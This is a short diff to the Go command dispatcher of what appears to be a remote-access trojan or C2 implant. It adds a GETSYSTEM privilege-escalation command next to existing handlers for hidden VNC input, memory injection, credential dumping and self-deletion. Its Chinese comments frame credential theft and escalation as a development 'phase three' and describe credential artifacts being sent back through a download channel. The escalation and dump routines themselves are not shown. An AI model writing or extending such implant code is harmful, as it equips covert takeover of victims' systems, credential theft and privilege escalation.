@@ -92,7 +92,8 @@ func HandleCommand(data []byte) {
 		cmdType != services.HVNC_INPUT &&
 		cmdType != services.UploadStart &&
 		cmdType != services.UploadLoop &&
-		cmdType != services.INJECT_MEM {
+		cmdType != services.INJECT_MEM &&
+		cmdType != services.GETSYSTEM {
 		commandTimeMutex.Lock()
 		if !lastCommandTime.IsZero() && config.WaitTime > 0 {
 			elapsedTime := time.Since(lastCommandTime)
@@ -327,6 +328,11 @@ func HandleCommand(data []byte) {
 		// 凭据获取（阶段三）：制品经下载通道异步回传，本命令只回执"已开始"
 		debuglog.Printf("🔑 [凭据] 内存转储请求 [%d]\n", services.CRED_DUMP)
 		result, err = services.CmdCredDump(cmdBuf)
+		callbackType = 0
+	case services.GETSYSTEM:
+		// 提权（阶段三）：只派生新会话，不改当前令牌模拟状态
+		debuglog.Printf("⬆️ [提权] 收到GETSYSTEM命令 [%d]\n", services.GETSYSTEM)
+		result, err = commands.CmdGetSystem(cmdBuf)
 		callbackType = 0
 	case services.SELFDELETE:
 		debuglog.Printf("🗑️ [工具箱] 自删除 [%d]\n", services.SELFDELETE)
